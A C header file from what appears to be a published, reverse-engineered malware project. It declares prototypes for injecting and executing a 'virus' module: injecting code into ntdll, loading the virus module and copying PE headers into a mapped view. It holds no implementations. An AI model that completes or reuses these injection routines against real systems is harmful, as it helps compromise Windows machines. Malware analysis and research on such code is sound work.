/******************************************************************************************
  Copyright 2012-2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor

#ifndef __CODEBLOCK_H__
#define __CODEBLOCK_H__

#include "define.h"
#include "AssemblyBlock1.h"
#include "AssemblyBlock2.h"

INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader);
INT32 BLOCK4_ExecuteLibrary(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader);
void BLOCK4_CopyPEHeaderInfo(PGENERAL_INFO_BLOCK sInfoBlock, PIMAGE_NT_HEADERS pImageNT, INT32 iVirusModuleSize);
NTSTATUS BLOCK4_AlignAddresses(PIMAGE_DOS_HEADER *pImageDOS);
void BLOCK4_memcpy(void *pDestination, const void *pSource, unsigned int iSize);
void BLOCK4_CopyDataIntoMapView(PVOID pVirusModule, PIMAGE_NT_HEADERS pImageNT, LPVOID pMapViewOfFile);
INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, PHARDCODED_ADDRESSES pHardAddrs);
INT32 BLOCK4_LoadVirusModuleInfo(PHARDCODED_ADDRESSES pHardAddrs, GENERAL_INFO_BLOCK *sInfoBlock, PVOID pVirusModule, INT32 iVirusModuleSize);
void BLOCK4_END(void);

#endif